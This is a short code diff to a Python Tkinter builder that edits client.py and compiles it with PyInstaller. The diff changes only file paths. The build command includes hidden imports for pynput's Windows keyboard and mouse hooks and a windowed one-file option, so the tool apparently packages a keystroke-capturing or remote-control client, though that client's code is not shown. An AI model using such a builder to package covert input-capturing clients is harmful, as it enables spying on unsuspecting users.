@@ -26,7 +26,7 @@ def null_callback():
 
 
 def check_main_files():
-    if not os.path.isfile("src/client.py"):
+    if not os.path.isfile("client.py"):
         tkinter.messagebox.showerror("Error", "Missing src/client.py")
         sys.exit(0)
 
@@ -63,7 +63,7 @@ def save_files(client_args):
 
     main_match = "if __name__ == \"__main__\":"
 
-    file = open("src/client.py", "r")
+    file = open("client.py", "r")
     file_contents = file.readlines()
     file.close()
 
@@ -75,7 +75,7 @@ def save_files(client_args):
     file_contents = file_contents[:i]
     file_contents.append(client_new_line)
 
-    file = open("src/client.py", "w")
+    file = open("client.py", "w")
     file.writelines(file_contents)
     file.close()
 
@@ -226,10 +226,10 @@ class Setup:
             if bool(self.one_file.get()):
                 onefile = "--onefile"
 
-            command_arg = f"{self.pyinstaller} src/client.py {windowed}{icon_command}{onefile} -y --clean --hidden-import " \
+            command_arg = f"{self.pyinstaller} client.py {windowed}{icon_command}{onefile} -y --clean --hidden-import " \
                           f"pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module " \
                           f"FixTk --exclude-module tcl --exclude-module tk --exclude-module _tkinter --exclude-module " \
-                          f"tkinter --exclude-module Tkinter "
+                          f"tkinter --exclude-module Tkinter"
 
             def run_command():
                 self.command = subprocess.Popen(command_arg, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
